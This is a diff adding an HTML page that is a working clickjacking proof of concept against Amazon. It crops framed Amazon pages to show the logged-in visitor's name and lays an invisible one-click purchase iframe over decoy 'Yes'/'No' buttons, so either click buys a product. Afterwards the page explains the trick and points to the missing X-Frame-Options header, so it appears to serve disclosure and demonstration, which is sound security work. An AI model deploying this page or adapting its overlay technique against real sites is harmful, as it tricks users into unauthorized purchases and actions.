@@ -1,0 +1,129 @@
+<html>
+
+<title>Click-jacking on Amazon.com</title>
+<head>
+<style type="text/css">
+body {
+	background-color: #fafafa;
+}
+a {
+	color:rgb(228, 121, 17);
+}
+
+#name-outer {
+	width:80px;
+	height:20px;
+	overflow:hidden;
+	position:relative;
+	left:-3px;
+}
+
+#name-inner {
+	position:absolute;
+	top:-60px;
+	left:-946px;
+	width:1280px;
+	height:1200px;
+}
+
+#purchase-outer {
+	width:160px;
+	height:30px;
+	overflow:hidden;
+	position:relative;
+	filter:alpha(opacity=0); 
+  	opacity:0.0;
+  	z-index:99999;
+}
+
+#purchase-inner {
+	position:absolute;
+	top:-216px;
+	left:-1100px;
+	width:1280px;
+	height:1200px;
+	z-index:999999;
+}
+
+.container {
+	margin-left: auto;
+	margin-right: auto;
+	width:800px;
+	padding:20px;
+	color:#666;
+}
+
+#amazon {
+	border:1px solid #eee;
+	background-color: #fff;
+	color:rgb(228, 121, 17);
+	font-family: arial;
+	font-weight: bold;
+	font-size: 12px;
+}
+.buttons {
+	position:relative;
+	top:-25px;
+	z-index:999;
+}
+
+.hidden {
+	display: none;
+}
+
+</style>
+</head>
+
+<body>
+
+<div class='container'>
+
+	This demo requires you to be currently logged into Amazon and have one-click purchases enabled.
+
+</div>
+
+<div class='container hidden' id='amazon'>
+
+	<iframe scrolling=no style='position:absolute;z-index:88888;border:0px'></iframe>
+
+	<div id='name-outer'>
+		<iframe src="https://www.amazon.com/gp/yourstore/home?ie=UTF8&ref_=topnav_ys" id='name-inner' scrolling=no onload='show()'></iframe>
+	</div> 
+
+	<br>
+
+	Do you find it strange that I know your name? 
+
+	<br><br>
+
+	<div id='purchase-outer'>
+		<iframe src="http://www.amazon.com/Click-Special-Edition-Adam-Sandler/dp/B000HT386M/ref=sr_1_4?ie=UTF8&qid=1376256089&sr=8-4&keywords=click" id='purchase-inner' scrolling=no></iframe>
+	</div> 
+
+	<div class='buttons'>
+		<input type='button' value='Yes'><input type='button' value='No'>
+	</div>
+
+</div>
+
+<div class='container hidden' id='how'>
+
+	Congrats, if you clicked either button, you just bought something on Amazon.  Of course, I could have added my own product to Amazon and sold you that instead of an Adam Sandler movie.  This exploit uses some basic iframe positioning and some click-jacking.  Amazon should really use the <code>X-Frame-Options: SAMEORIGIN</code> header to prevent this from happening.  You can <a href='javascript:increase_opacity()'>reveal the hidden iframe</a> to see how it works.
+
+</div>
+
+<script type='text/javascript'>
+
+	function show() {
+		document.getElementById("amazon").style.display = "block";
+		document.getElementById("how").style.display = "block";
+	}
+
+	function increase_opacity() {
+		document.getElementById("purchase-outer").style.opacity = "0.2";
+	}
+
+</script>
+
+</body>
+</html>
